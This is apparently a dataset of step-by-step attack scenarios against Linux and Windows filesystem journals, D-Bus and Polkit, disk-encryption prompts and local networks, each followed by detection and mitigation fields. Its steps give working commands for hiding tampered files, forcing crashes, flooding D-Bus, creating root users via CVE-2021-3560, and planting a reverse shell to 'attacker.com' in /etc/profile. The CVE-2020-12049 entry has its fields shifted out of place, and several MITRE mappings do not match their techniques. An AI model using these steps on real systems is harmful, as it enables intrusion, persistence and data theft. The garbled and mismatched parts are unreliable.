Attack Steps: Step 1: Understand that fsck (filesystem check) relies on journal entries to replay changes and determine file health. If journals are invalid or incorrectly formatted, fsck may skip checking certain blocks. Step 2: Gain access to raw disk (e.g., boot from a Kali/Ubuntu Live ISO) without mounting the target partition. For example: mount -o ro /dev/sda1 /mnt. Step 3: Use e2image -ra /dev/sda1 image.raw to get the entire FS image including the journal. Step 4: Locate and extract the journal section using debugfs → logdump, or directly with dd: dd if=/dev/sda1 of=journal.bin bs=4096 skip=START count=NUM. Step 5: Open journal.bin in hexedit. Tamper with transaction headers or checksum fields — e.g., zero out the commit block or invalidate journal UUID references. Step 6: Write the modified journal back using dd. This causes fsck to skip replay or ignore inconsistencies silently. Step 7: On next reboot, the system believes journal replay is clean, and it won't detect your tampered file (e.g., a replaced /etc/passwd). Step 8: This bypass lets malicious files persist despite supposed checks. Step 9: Defender should hash and verify journal separately and compare inode tables before/after reboot.
Impact: Persistent malware, hidden system file modifications
Detection Method: Monitor fsck logs for journal skip/warning; validate journal CRC; scan for orphaned inodes
Solution: Enable data checksumming; validate journal UUIDs and inode trees; restrict physical/raw disk access
Tags: fsck bypass, Linux journaling attack, stealth malware

Title: NTFS $LogFile Abuse
Attack Type: NTFS Journal Tampering for ACL & Forensics Evasion
Scenario Description: NTFS uses $LogFile for journaling. Attackers with raw access can manipulate entries to remove traces of file changes or silently update security descriptors (ACLs).
Tools Used: FTK Imager, HxD, winobj, NTFSLogTracker, PowerShell, dd
Attack Steps: Step 1: Understand that NTFS uses $LogFile (a hidden metadata file) to journal all file system changes. Windows uses this for recoverability and forensic auditing. Step 2: Use FTK Imager or Mount Image Pro to mount a disk image of a target NTFS volume, preferably offline. Step 3: Locate and extract $LogFile using FTK or dd: dd if=\\.\PhysicalDrive1 of=logfile.raw skip=START count=NUM. Step 4: Open $LogFile in a hex editor (e.g., HxD). Study Multi Sector Header (e.g., RCRD entries) and search for update records involving target files (like an edited executable or sensitive document). Step 5: Modify those update entries or delete blocks that log creation/modification timestamps. Step 6: Save the tampered file and write it back using raw disk access. Step 7: Alternatively, craft a fake ACL change entry for a target file to grant yourself full access (manipulating security descriptors like DACL). Step 8: On next boot, Windows will believe journal is valid and apply or ignore changes accordingly. Step 9: Defender must use $LogFile validators (like NTFSLogTracker) or snapshot diffing to catch such attacks. Step 10: Lock access to low-level NTFS files and enable Secure Boot where possible.
Vulnerability: $LogFile is not integrity-checked at kernel level
Detection Method: Compare $LogFile to $MFT; monitor for access to raw volume; hash ACLs of critical files
Solution: Use EDRs with $LogFile parsing; disable raw disk access for non-admins; enforce disk integrity boot checks

Title: Steganography via Journal
Attack Type: Hidden Data Storage Inside Journaling Blocks
Scenario Description: Journal blocks (in both NTFS and ext4) can hold hidden data without ever appearing in normal file listings, acting as stealth storage for command-and-control or data exfil.
Tools Used: ext4magic, dd, hexedit, HxD, Forensic Explorer, PowerShell
Attack Steps: Step 1: Understand that journals store raw binary data representing file operations (e.g., a write to /home/user/file.txt). These blocks are temporary but readable before being flushed. Step 2: Create a virtual disk or use a USB disk with ext4/NTFS. Format it and perform a normal write operation like echo hello > /home/user/test.txt. Step 3: Use dd to dump journal space before rebooting or unmounting: dd if=/dev/sdb1 of=journal.bin bs=4096 skip=START count=NUM. Step 4: Open journal.bin in hexedit and inject hidden data (e.g., encoded strings, commands, or keys) into unused journal padding blocks. Step 5: Alternatively, craft a write operation with hidden payload inside a write structure and trigger journal-only mode (without syncing metadata) using mount option data=journal. Step 6: Leave the filesystem unclean (don't sync), so data persists in journal space. Step 7: For Windows, open $LogFile and use HxD to insert data into gaps or known unused slots. Step 8: Since these files are never flushed, they don’t exist in the filesystem tree and avoid detection from ls or standard forensic scans. Step 9: To exfiltrate, dump journal and parse manually or via automation (Python script with offset parser). Step 10: Defender should hash journal sectors and scan for anomalies or unknown binary strings.
Vulnerability: Journals store data temporarily, often unverified
Impact: Hidden data channel, stealth payload delivery
Detection Method: Monitor raw journals for unauthorized binary content; check size deviations in journal space
Solution: Wipe journal after sync; disable journaling for untrusted drives; scan for encoded content inside logs or journals
Tags: Hidden Channel, Journal Stego, Forensic Evasion

Title: Wipe Trace of Temporary Exploit Binaries
Scenario Description: Exploit binaries written to temp dirs can disappear after crash due to lack of fsync or journal flush, erasing forensic trails completely.
Tools Used: fsstress, dd, Live ISO, /tmp, crash trigger
Attack Steps: Step 1: Use /tmp or /var/tmp as the staging ground. These locations are often not synced immediately, especially if the attacker avoids calling fsync(). Step 2: Write the payload to disk (e.g., reverse shell binary): cp shell.bin /tmp/root_payload. Step 3: Execute it and remove evidence: ./tmp/root_payload; rm /tmp/root_payload. Step 4: Trigger a crash immediately before the filesystem metadata is flushed to disk. Use methods like echo c > /proc/sysrq-trigger or reboot -f. Step 5: Upon reboot, /tmp/root_payload might not exist at all—ext4 journal replays operations, but due to async delete timing, some entries are lost. Step 6: Even forensic tools relying on inode tables (e.g., extundelete) may fail, because the data was never committed to the main FS tree. Step 7: Defender sees no trace in logs or deleted file recovery tools. Step 8: Defender must monitor journaling behavior and hash /tmp content frequently, or mount /tmp as tmpfs.
Vulnerability: Metadata not flushed, allowing file loss post-crash
Detection Method: Monitor tmp dir journal; correlate last executed binaries; check RAM snapshots on crash
Solution: Mount /tmp as tmpfs; enforce immediate sync after execution; limit write+exec perms in shared directories
Tags: Forensic Evasion, Journal Flush Bypass, Exploit Cleanup

Title: Dirty Journal for Recovery Root Shell
Attack Type: Inject Root Shell via Uncommitted Journal Write
Scenario Description: Attacker writes a shell to a privileged path without syncing metadata, triggers crash, allowing journal replay to restore root-executable payload.
Tools Used: dd, echo, Live ISO, debugfs, /etc/profile, bashrc, crash
Attack Steps: Step 1: Get user access (or sudo) and write a payload to a privileged execution file (e.g., /etc/profile or /etc/bashrc). For example: echo '/bin/bash' >> /etc/profile. Step 2: Do not execute sync or wait for disk flush. File is now journaled but metadata may still be cached. Step 3: Trigger a system crash before the flush: use echo c > /proc/sysrq-trigger (with root) or other crash simulation tools. Step 4: Upon reboot, ext4 journal replays the data block change — in this case, the modified /etc/profile. Step 5: When root logs in or when system boot hits bash, the attacker’s payload runs (e.g., nc attacker.com 4444 -e /bin/bash). Step 6: Defender likely won’t notice because logs are normal, and file timestamps may still look clean. Step 7: Use debugfs to analyze journal blocks for unintended shellcode or command insertions. Step 8: This works only if attacker has write access and system allows unsynced writes. Step 9: Defenders must monitor /etc/ changes and validate file integrity at boot using hash lists or integrity measurement tools.
Target Type: Linux system init or login scripts
Vulnerability: Journal replays data edits without metadata update
MITRE Technique: T1547.001 – Boot or Logon Autostart Execution
Impact: Root shell injected via replayed config files
Detection Method: Monitor early boot file changes; hash all login scripts; monitor for unsynced changes to system paths
Solution: Enforce signed login scripts; run journal verification after crashes; reduce non-root write access to /etc/
Tags: Recovery Shell, Journal Trick, Boot-time Backdoor

Title: Mount-Time Journal Exploit (e.g., ext4)
Attack Type: Exploit triggered by journal replay during mount
Scenario Description: When ext4 mounts a filesystem after an unclean shutdown, it replays journal entries. Malformed or crafted journal blocks can trigger kernel bugs during replay.
Tools Used: e2image, mount, debugfs, Live CD, crash dump tools
Attack Steps: Step 1: Use a Linux system with ext4 and generate a journaled image using: e2image -ra /dev/sdX hacked.img. Step 2: Gain access to a system with physical or block-level access (e.g., via recovery boot, live CD, or VM disk mount). Step 3: Modify the journal blocks using a hex editor or inject malicious replay data using debugfs. The goal is to craft unexpected metadata or pointer states (e.g., bad inode or directory block references). Step 4: Ensure filesystem is unmounted or crashed before flushing (e.g., simulate crash using echo c > /proc/sysrq-trigger). Step 5: Attempt to mount the filesystem: mount /dev/sdX /mnt. On mount, the kernel replays the journal, which includes the malformed block. Step 6: If vulnerability exists in the kernel's journal replay logic, this may trigger a kernel panic, DoS, or—if chained with another memory corruption—RCE. Step 7: Use this in a lab first; wrong editing may permanently corrupt the FS. Step 8: Defenders must verify journal block structure pre-mount in untrusted disks or use read-only mount first.
Vulnerability: Unsafe parsing during journal replay on mount
Impact: Kernel crash or code execution at boot
Detection Method: Enable journald logging during mount; use kernel debug logs to catch replay parsing bugs
Solution: Use mount -o ro for recovery disks; validate journal with fsck -n; never auto-mount untrusted images
Tags: ext4, Mount, Filesystem Exploit, Kernel Panic

Title: Filesystem Rollback via Journal Abuse
Attack Type: Targeted file rollback via journal replay
Scenario Description: Attacker selectively reverts a file to an earlier state by manipulating journal entries and triggering unclean shutdowns, effectively undoing updates post-journal.
Tools Used: e2image, debugfs, fsync, mount, dd, crash trigger
Attack Steps: Step 1: Understand that ext4 journaling ensures consistency by committing metadata and sometimes data to the journal first. Step 2: Gain temporary access to system and modify a sensitive file (e.g., sudoers, SSH keys, cron jobs). Step 3: Immediately trigger a sync (sync or fsync(file)) so that changes are written to the journal but not flushed to main disk metadata. Step 4: Force a crash (e.g., echo c > /proc/sysrq-trigger) before the next commit/flush occurs. Step 5: On reboot, use a modified journal image (from an earlier backup using e2image) to replace the live journal. Step 6: Mount the FS and replay that older journal image. This undoes changes made post-journal, effectively rolling back the filesystem. Step 7: Useful in forensic evasion or undoing privilege removal (e.g., if admin deletes attacker's account). Step 8: Defenders should track boot-to-boot hash states and monitor for mismatched file mtime vs ctime.
Vulnerability: Rollback due to replayed but outdated journal entries
Impact: Privilege recovery, rollback of file modifications
Detection Method: Check file mtime/ctime consistency; monitor boot/crash logs; detect journal hash mismatch
Solution: Maintain file integrity checksums between reboots; lock journal overwrites with LSM or kernel features

Title: XFS Log Abuse
Scenario Description: XFS uses its own journaling format (log) and replay system. Attackers can alter metadata/logs using raw disk access to execute rollback, hide files, or crash system.
Tools Used: xfs_db, xfs_logprint, hexedit, Live ISO, mount, crash
Attack Steps: Step 1: Identify a Linux system with the XFS filesystem in use. Use df -T or mount to confirm. Step 2: Get block-level access to the disk (via Live ISO or compromised shell). Step 3: Use xfs_logprint /dev/sdX to inspect current log entries. Step 4: Use xfs_db in expert mode to navigate to the AGF (Allocation Group Free list), B-tree nodes, or inode pointers. Step 5: Modify fields related to file allocation, such as pointing a file’s inode to junk blocks or removing directory entries from logs. Step 6: If you crash the system now (echo c > /proc/sysrq-trigger) and let the replay apply, XFS will use the tampered metadata—effectively hiding or misdirecting file access. Step 7: Defender won’t find normal traces because it appears “clean” post-replay. Step 8: Replay may also allow rollback of security logs or cron tab removals. Step 9: Only highly skilled defenders inspecting replay buffers or AGF inconsistencies can catch this.
Vulnerability: XFS journal metadata manipulated via low-level edits
MITRE Technique: T1565.002 – Stored Data Manipulation: File Metadata
Impact: File deletion concealment, journal rollback, stealth
Detection Method: Check XFS replay logs with xfs_logprint; audit inode maps and log consistency before mount
Solution: Always unmount cleanly; never auto-replay XFS logs on boot from suspicious disks; use signed recovery tools
Tags: XFS Log Replay, Metadata Tampering, Forensics Bypass
Source: XFS Dev Manual, Red Team XFS

Title: Spoofing D-Bus Services
Scenario Description: An attacker launches a rogue service that claims a well-known D-Bus name before the real application can, tricking clients into talking to the attacker
Attack Steps: Step 1: Understand that on Linux, D-Bus is an inter-process communication system. Applications connect to the bus and claim a “bus name” like org.freedesktop.Notifications. Step 2: A D-Bus service is usually launched after login, but there's a race condition where a user-space process (even a malicious one) can register the name before the legit app does. Step 3: Write a script in Python or use dbus-python to register a service with a known trusted name, e.g., org.gnome.ScreenSaver. Step 4: Start your script as early as possible (e.g., via .bash_profile, systemd user service, or startup app). Step 5: When the real client app sends messages to the D-Bus name, your malicious service receives them. Step 6: Log, manipulate, or reply with fake responses. Step 7: This can trick the app into showing false notifications, executing unintended logic, or exposing credentials. Step 8: This works best on session bus, where users can register services freely. Step 9: Defenders can detect hijack via dbus-monitor --session and validating which process owns a bus name (busctl --user).
Impact: Data hijacking, spoofed responses, logic corruption
Detection Method: Monitor bus name ownership with busctl; validate the startup sequence and service authenticity
Solution: Use D-Bus activation instead of passive connection; enforce service ownership with PolicyKit or AppArmor

Title: Message Sniffing on Session Bus
Scenario Description: If an attacker has local access, they can listen to D-Bus messages on the same user session bus and capture sensitive data.
Attack Steps: Step 1: Understand that D-Bus session bus traffic is often not encrypted or protected from same-user access. Step 2: If attacker can run code as the same user (e.g., inside user’s session), they can listen to all D-Bus traffic using: dbus-monitor --session. Step 3: Launch this command and watch traffic like application launches, password dialogs, notifications, etc. Step 4: Filter or grep for keywords like “password”, “auth”, “secret”, “token” to extract useful data. Step 5: Write a simple script to log all bus messages in real-time. Step 6: Some apps mistakenly pass credentials or private data over D-Bus assuming the session is private. Step 7: Use this method to gather context, running commands, clipboard data, or response triggers. Step 8: This attack works best in shared or poorly configured environments (e.g., weak X session isolation, shared VMs). Step 9: Defender can use busctl monitor or audit logs to identify unusual listeners.
Vulnerability: No encryption or auth on session D-Bus traffic
Detection Method: Check for suspicious listeners; enable AppArmor or SELinux policies restricting dbus-monitor usage
Solution: Avoid passing sensitive data over D-Bus; use peer-to-peer pipes or encrypted secrets manager where required
Tags: D-Bus Monitoring, Privacy Leak, Credential Exposure

Title: Man-in-the-Middle (MitM) Between Apps
Scenario Description: An attacker intercepts and modifies D-Bus traffic between two applications (e.g., system UI and privileged service) by inserting themselves as a proxy
Attack Steps: Step 1: The D-Bus architecture allows apps to communicate via well-known bus names and interface methods. An attacker with same-user access can intercept this if they trick one side to connect to their proxy. Step 2: Set up a proxy that registers a D-Bus name (e.g., org.kde.policyAgent) before the legitimate app does. Step 3: When the client app tries to connect, it sends its message to the attacker instead. Step 4: The attacker’s proxy forwards the message to the real service, captures the reply, possibly modifies it, and returns it to the client. Step 5: This is a full MitM – the client sees no difference, and the attacker reads or changes the data in transit. Step 6: Use tools like socat or custom Python scripts with dbus to implement the forwarder. Step 7: This can be used to inject malicious responses, downgrade configs, or extract session tokens. Step 8: Only feasible on session bus or in environments without PolicyKit/SELinux hardening. Step 9: Defender can detect abnormal D-Bus relays with system logs and monitor D-Bus ownership history.
Vulnerability: Lack of mutual authentication on D-Bus connections
Impact: Data tampering, session hijack, app misbehavior
Detection Method: Monitor for proxy patterns; validate D-Bus ownership order; alert on abnormal connection delays
Solution: Enforce strict D-Bus policies; use peer credentials; avoid trusting first responder without signature validation
Tags: D-Bus MitM, Local Interception, Message Tampering

Title: D-Bus Signal Injection
Attack Type: Triggering app logic by sending fake D-Bus signals
Scenario Description: Many applications listen to D-Bus signals to take actions (like closing apps, changing settings). If not protected, any user can inject signals to control them.
Attack Steps: Step 1: Understand that many Linux desktop applications use D-Bus signals to trigger behavior (e.g., org.freedesktop.Notifications, org.gnome.ScreenSaver). Step 2: Use dbus-monitor --session to observe which signals a target app listens to (e.g., a media player reacts to “Pause”, “Next”, “Volume” events). Step 3: Identify a signal you want to forge. For example: org.gnome.ScreenSaver may lock the screen when it receives Lock. Step 4: Use dbus-send --session --dest=org.gnome.ScreenSaver /org/gnome/ScreenSaver org.gnome.ScreenSaver.Lock to send the forged signal. Step 5: If the application doesn't verify the signal sender (via GetConnectionUnixUser() or similar), it executes the action. Step 6: You can write a script to inject signals at intervals or during critical moments (e.g., force logout or inject shutdown). Step 7: Some services can be tricked into loading files, executing scripts, or modifying settings based on crafted signal payloads. Step 8: This can lead to DoS, data corruption, or even remote code execution if combined with logic flaws. Step 9: Defenders should audit D-Bus signal handlers and enforce sender authentication.
Vulnerability: No authentication on D-Bus signal receivers
Impact: Unintended app behavior, denial of service, RCE
Detection Method: Use auditd or dbus-monitor to track unauthorized signal sources; validate sender UID in code
Solution: Enforce sender checks with dbus_connection_get_unix_user(), use Polkit for critical action authentication
Tags: Signal Injection, App Hijack, D-Bus Abuse

Title: Abusing Polkit over D-Bus
Attack Type: Privilege Escalation via D-Bus-exposed Polkit Interfaces
Scenario Description: Polkit allows permission requests via D-Bus. If unprotected or misconfigured (like in CVE-2021-3560), attackers can elevate to root via crafted D-Bus requests.
Attack Steps: Step 1: Understand that Polkit (formerly PolicyKit) handles privilege escalation in Linux by granting temporary root access to approved users via policies. Step 2: Identify a Polkit service that can be triggered via D-Bus, such as org.freedesktop.Accounts, org.freedesktop.systemd1, or org.freedesktop.hostname1. Step 3: In vulnerable versions (like Polkit <= 0.105), improper handling of authorization checks allows unprivileged users to exploit timing flaws. Step 4: For CVE-2021-3560: send a D-Bus message like dbus-send --system --dest=org.freedesktop.Accounts --type=method_call /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser followed by another D-Bus call before auth completes. Step 5: Quickly cancel before Polkit prompts user, bypassing prompt logic. Step 6: Repeat this using a timing loop (bash or Python) until it succeeds. Step 7: Once new user is created with sudo rights, switch users and escalate privileges using sudo. Step 8: This is a fully local escalation to root without user interaction. Step 9: Patch or update Polkit to latest secure version.
Vulnerability: Polkit timing bug or policy misconfiguration
Impact: Full root access from unprivileged user
Detection Method: Monitor auth request frequency; audit user creation logs; detect privilege changes in /etc/sudoers
Solution: Patch Polkit to latest version; monitor D-Bus methods hitting org.freedesktop.Accounts; enforce strong policy rules
Tags: Polkit, CVE-2021-3560, Root Escalation, D-Bus Abuse

Title: Hijacking Auto-Start Services
Scenario Description: If a service is auto-started via D-Bus and not yet running, attacker can hijack its service binary before it's launched by D-Bus autospawn mechanism.
Attack Steps: Step 1: Understand that D-Bus can autospawn services on demand if they are defined in .service files under ~/.local/share/dbus-1/services/. Step 2: Many desktop services are lazy-loaded: they start only when another app requests them via D-Bus. Step 3: If attacker can place a .service file under that path before the real service is installed or started, they can define what binary should be launched. Step 4: Create a fake .service file, e.g., org.freedesktop.Notifications.service, with content: [D-BUS Service]\nName=org.freedesktop.Notifications\nExec=/home/attacker/malware. Step 5: Place the malicious binary at that path. Step 6: When any app tries to use desktop notifications, D-Bus autospawns the attacker’s binary. Step 7: This can be used to launch backdoors, loggers, or privilege probes. Step 8: Defender likely won’t notice unless .service directory is monitored. Step 9: Cleanup includes deleting the fake .service file and replacing logs.
MITRE Technique: T1574.001 – Hijack Execution Flow: DLL Search Order
Impact: Code execution on-demand in user session
Detection Method: Watch for new files in ~/.local/share/dbus-1/services; audit D-Bus launch logs
Solution: Restrict write access to service paths; use signed binaries; validate Exec path on D-Bus service activation

Title: Denial-of-Service via D-Bus Flooding
Scenario Description: D-Bus is a shared IPC mechanism. If flooded with too many signals or large messages, it can crash or freeze desktop environments and services.
Tools Used: dbus-send, Python-dbus, bash loop, while true
Attack Steps: Step 1: Understand that the D-Bus daemon is a central communication service. Most Linux systems use the session bus and system bus for IPC. Step 2: Open a terminal on a Linux desktop system. Use dbus-monitor --session to observe how D-Bus reacts to signals. Step 3: Start flooding the session D-Bus using a loop: while true; do dbus-send --session --dest=org.freedesktop.Notifications /org/freedesktop/Notifications org.freedesktop.Notifications.Notify string:"Test" string:"Attack" string:"" string:"" array:string:"" dict:string:string:"" int32:1; done Step 4: As the flood continues, CPU usage spikes, D-Bus may crash or lag, and desktop elements (like notifications or app launchers) may freeze. Step 5: You can also use Python with dbus-python module to generate messages with huge payloads. Step 6: This technique can be used to DoS systemd services, GNOME Shell, or KDE Plasma. Step 7: The user may lose session control or be forced to reboot.
Vulnerability: No rate-limiting on D-Bus message volume
Impact: App freeze, CPU exhaustion, desktop unusable
Detection Method: Monitor abnormal message counts in D-Bus logs; use journalctl to check D-Bus flood symptoms
Solution: Implement D-Bus rate-limiting with busconfig, restrict abusive signals, patch desktop environments

Title: Accessing Hardware Services via D-Bus
Scenario Description: Services like UPower and NetworkManager expose D-Bus APIs to manage system features like power, Wi-Fi, and brightness. Misuse can disrupt system behavior.
Attack Steps: Step 1: Many desktop Linux systems expose hardware services like org.freedesktop.UPower, org.freedesktop.NetworkManager on the system bus via D-Bus. Step 2: If you're a local user with session access, try listing services with gdbus introspect --system --dest org.freedesktop.UPower --object-path /org/freedesktop/UPower. Step 3: Use commands like dbus-send --system --dest=org.freedesktop.UPower /org/freedesktop/UPower org.freedesktop.UPower.Suspend to try to suspend the system. Step 4: Similarly, nmcli can be used to disable Wi-Fi: nmcli radio wifi off. These D-Bus methods map to privileged actions. Step 5: On some misconfigured systems (like older distros), users may execute them without Polkit prompt or checks. Step 6: You can write a script to toggle Wi-Fi, suspend, or hibernate system repeatedly. Step 7: This can be used to disrupt user sessions, trigger crash dumps, or force reboots. Step 8: To defend, enforce strict Polkit policies and check dbus-daemon rules for these services.
Vulnerability: Misconfigured Polkit or insecure D-Bus method access
MITRE Technique: T1562.004 – Disable or Modify System Firewall
Detection Method: Monitor system D-Bus logs for calls to UPower, NetworkManager, or sudden state transitions
Solution: Restrict UPower and NetworkManager methods via Polkit; apply user authentication policies
Tags: D-Bus Hardware Abuse, Polkit Config, DoS

Title: CVE-Based D-Bus Exploit (CVE-2020-12049)
Scenario Description: A heap-based buffer overflow in libdbus can be triggered to execute arbitrary code or crash apps using vulnerable versions of dbus-daemon.
Tools Used: Custom C exploit, metasploit, vulnerable libdbus
Attack Steps: Step 1: CVE-2020-12049 affects libdbus version < 1.12.18, where crafted D-Bus messages can cause a heap overflow. Step 2: Set up a Linux test VM with an old vulnerable distro (e.g., Debian 10.2 or Ubuntu 18.04 without patches). Use `dpkg -l
Target Type: grep libdbusto verify the vulnerable version. **Step 3:** Compile or download the proof-of-concept exploit code from GitHub or security researcher blogs. **Step 4:** The exploit sends a maliciously crafted message to the dbus-daemon over the session or system bus. **Step 5:** When the malformed message is processed, it causes a heap overflow in the daemon, leading to memory corruption. **Step 6:** In practice, this can crash the D-Bus service or allow attackers to overwrite critical memory and potentially achieve code execution depending on the target. **Step 7:** In modern systems with ASLR/DEP, it may still be usable for DoS or triggering watchdogs. **Step 8:** Always patch tolibdbus` ≥ 1.12.18 to stay secure. Step 9: Use AppArmor/SELinux profiles to confine apps with D-Bus access.
MITRE Technique: Heap buffer overflow in D-Bus parser (libdbus)
Detection Method: DoS or potential remote code execution (RCE)
Solution: Monitor dbus-daemon crashes; use heap protection auditing tools like Valgrind, GDB
Tags: Patch libdbus to latest version; audit message formats; limit D-Bus exposure to untrusted clients
Source: D-Bus CVE, Heap Overflow, libdbus Exploit

Title: Race with D-Bus Ownership
Attack Type: Race Condition on D-Bus Service Ownership
Scenario Description: A malicious local user races to claim ownership of a well-known D-Bus service before the legitimate service starts, allowing interception or manipulation of messages.
Attack Steps: Step 1: Understand that on Linux systems, D-Bus services register unique names on the bus (e.g., org.freedesktop.someService). Only one service can own a name at a time. Step 2: The legitimate system service starts and attempts to register its well-known D-Bus name. Step 3: The attacker writes a script that continuously attempts to claim the target D-Bus name as soon as the legitimate service exits or before it starts, using the command dbus-send or D-Bus libraries. Step 4: For example, the attacker runs a loop with dbus-send --session --dest=org.freedesktop.someService ... or uses dbus-monitor to watch the bus, detecting when the name is free. Step 5: When the legitimate service shuts down or restarts, the attacker's script quickly registers the same name before the original service can reclaim it. Step 6: This allows the attacker’s fake service to receive all D-Bus messages intended for the real service, enabling message interception, modification, or injection. Step 7: The attacker can spoof responses or trigger unintended behavior in client apps that trust the service. Step 8: This race condition requires precise timing and monitoring but can be automated with scripts. Step 9: To verify, use dbus-monitor to observe the service name ownership changes. Step 10: The impact includes privilege escalation, data theft, or service disruption. Step 11: To defend, ensure services are protected by system permissions, use unique bus names carefully, and monitor unexpected ownership changes. Enforce proper Polkit policies and use systemd socket activation to avoid such races.
Vulnerability: Race condition on D-Bus name ownership
Impact: Data interception, privilege escalation, service disruption
Detection Method: Monitor D-Bus ownership changes with logs or dbus-monitor; alert on unusual ownership switches
Solution: Use system policies restricting who can own well-known names; use systemd socket activation; apply security patches
Tags: D-Bus Race Condition, Man-in-the-Middle, IPC Exploit

Title: Key Buffer Overflow via Mashing
Scenario Description: When a system passphrase prompt has poor input length validation, rapidly mashing keys can overflow the input buffer, causing a crash or bypassing authentication fallback mechanisms.
Attack Steps: Step 1: Identify a system that prompts for an encryption passphrase or password (e.g., disk encryption on boot). Step 2: Understand the input buffer size for the passphrase prompt is limited and poorly checked by the system. Step 3: Use a USB keyboard or keyboard injection tool (like Rubber Ducky or a Python script with pyautogui) to rapidly send keypresses repeatedly to the prompt (also called "key mashing"). Step 4: The rapid keypresses overflow the passphrase input buffer, causing the system process handling the input to crash or malfunction. Step 5: When the passphrase prompt crashes or times out, some systems fall back to auto-decrypt mode using cached keys or a fallback keyfile. Step 6: This fallback behavior allows the attacker to bypass the encryption prompt without entering the actual passphrase. Step 7: Monitor the system’s response and confirm that after overflow and crash, the system proceeds with auto-decryption or bypass. Step 8: This attack requires physical or remote keyboard input capability, but no knowledge of the actual passphrase. Step 9: It may cause system instability, but provides a stealthy route past authentication. Step 10: To mitigate, systems should implement strict input validation, avoid fallback to cached keys on failure, and implement rate limiting or timeouts on input attempts.
Detection Method: Monitor kernel and authentication logs for crashes or unexpected fallback; audit input buffer handling
Solution: Patch input handling code; disable fallback to cached keys; enable secure timeout and input validation
Tags: Buffer Overflow, Passphrase Bypass, Keyboard Injection

Title: Passive Network Eavesdropping
Scenario Description: An attacker listens silently on a network to capture unencrypted communication data, such as usernames, passwords, messages, or other sensitive information, without altering traffic.
Attack Steps: Step 1: Understand that passive eavesdropping means listening on the network without sending any packets or interfering with the traffic. You only capture data to analyze it later. Step 2: Identify the target network to eavesdrop on, such as a local Wi-Fi network, corporate LAN, or public hotspot. The attacker must be physically present or connected to the same network segment to capture traffic. Step 3: Set up a device (laptop or Raspberry Pi) with packet capture software like Wireshark or tcpdump installed. Ensure the network interface is capable of promiscuous mode (receives all packets, not just those addressed to it). Step 4: Configure the network adapter in promiscuous mode to listen to all packets flowing in the network segment. On Wi-Fi, this may require monitor mode to capture wireless frames. Step 5: Start capturing network packets using Wireshark or tcpdump. If on a switched network, ARP spoofing or MAC flooding may be necessary to receive packets not destined for you (but this becomes active attack, so skipped here as focus is passive). Step 6: Let the capture run to collect network traffic data over time. This can include HTTP requests, FTP logins, DNS queries, emails, or chat messages if not encrypted. Step 7: Stop the capture after sufficient data is collected. Save the packet capture file (.pcap) for offline analysis. Step 8: Analyze the captured data inside Wireshark using filters to look for sensitive protocols (e.g., http, ftp, smtp) and identify unencrypted credentials or data. Step 9: Extract useful information such as usernames, passwords, session tokens, or sensitive files transmitted in clear text. Step 10: Use the extracted information to further exploit the system or gain unauthorized access (e.g., log into a user account with captured password). Step 11: Since this attack is passive, it is very hard to detect; monitoring tools may notice unusual ARP requests if active techniques are combined but pure passive eavesdropping leaves minimal traces. Step 12: Defenders can detect anomalies by monitoring network traffic patterns or by noticing unknown devices on the network via Network Access Control (NAC). Step 13: To prevent this attack, always use strong encryption like WPA3 on Wi-Fi, HTTPS/TLS for web traffic, SSH for remote connections, and VPNs for secure tunnels, which render captured data useless without decryption keys. Step 14: Regularly update firmware on networking devices to prevent vulnerabilities. Use network segmentation and strong authentication to reduce exposure. Step 15: Educate users to avoid sending sensitive data over unencrypted channels or public networks without VPN protection.
Detection Method: Network anomaly detection; NAC; IDS signatures looking for ARP spoofing or promiscuous mode detection
Solution: Use strong encryption (WPA3, TLS, SSH); VPN usage; network segmentation; user awareness training

Title: ARP Spoofing / Poisoning + Sniffing
Scenario Description: Attacker tricks devices on a LAN by sending fake ARP messages, making their machine appear as the gateway or another device, enabling interception of traffic.
Attack Steps: Step 1: Understand that ARP spoofing exploits the Address Resolution Protocol, which maps IP addresses to MAC addresses on LANs. It has no built-in authentication. Step 2: The attacker connects to the same local network (Wi-Fi or wired LAN) as the victims and has network access privileges. Step 3: Install tools like arpspoof or Ettercap to perform ARP poisoning and sniff traffic. Step 4: Run the tool to send fake ARP replies to the target machine(s), associating the attacker’s MAC address with the IP of the gateway/router, so traffic meant for the gateway goes to attacker first. Step 5: Similarly, send fake ARP replies to the gateway, associating attacker’s MAC with the victim's IP, to maintain two-way interception. Step 6: As a result, attacker’s machine sits between victim and gateway, acting as man-in-the-middle, intercepting, capturing, and optionally modifying network traffic. Step 7: Use sniffing tools like Wireshark or tcpdump simultaneously to capture and analyze intercepted packets. Step 8: Extract sensitive data like login credentials, session cookies, or other clear-text information from captured traffic. Step 9: If traffic is encrypted (HTTPS), attacker can attempt SSL stripping or replay attacks to downgrade or hijack sessions (see SSL stripping). Step 10: To stop attack, victim’s ARP cache must be cleared or reset; meanwhile attacker can maintain the attack by continuously sending spoofed ARP messages. Step 11: Because ARP spoofing is a local attack, the attacker must stay connected to the LAN. Detection can be done by monitoring ARP traffic for anomalies or duplicate IP-MAC mappings via intrusion detection systems (IDS). Step 12: Prevent by enabling dynamic ARP inspection on switches, using static ARP entries, employing encryption (HTTPS, VPN), and segmenting networks.
Detection Method: ARP table anomaly detection; IDS signatures for ARP spoofing; network monitoring for duplicate IP-MAC mappings
Solution: Enable Dynamic ARP Inspection (DAI); use encrypted protocols; static ARP entries; network segmentation and NAC

Title: MAC Flooding to Bypass Switch Filtering
Scenario Description: Attacker floods a network switch with many fake MAC addresses to overflow its Content Addressable Memory (CAM) table, causing it to broadcast all packets.
Attack Steps: Step 1: Know that switches learn MAC addresses dynamically and keep them in CAM tables to forward frames only to correct ports, improving security and efficiency. Step 2: Attacker gains access to the same local network segment as the target switch. Step 3: Install and use flooding tools like macof, which rapidly send Ethernet frames with random/fake source MAC addresses to the switch. Step 4: Start the flooding attack, causing the switch’s CAM table to fill up and overflow. Step 5: Once the CAM table is full, the switch cannot learn new MAC addresses and falls back to acting like a hub, broadcasting all traffic to every port. Step 6: This behavior allows the attacker’s machine to receive packets originally intended for other devices on the LAN. Step 7: Using a packet sniffer like Wireshark, attacker captures all broadcasted frames including sensitive data from other hosts. Step 8: Analyze captured data for passwords, files, or session tokens sent in clear text. Step 9: Attack is stealthy and often goes unnoticed unless network admins monitor CAM table usage or unusual broadcast traffic. Step 10: To mitigate, network administrators configure port security limiting MAC addresses per port, enable VLAN segmentation, and deploy intrusion detection/prevention systems. Step 11: Physical security to restrict unauthorized network access also reduces risk. Step 12: Switches with built-in CAM overflow protection features should be deployed where possible.
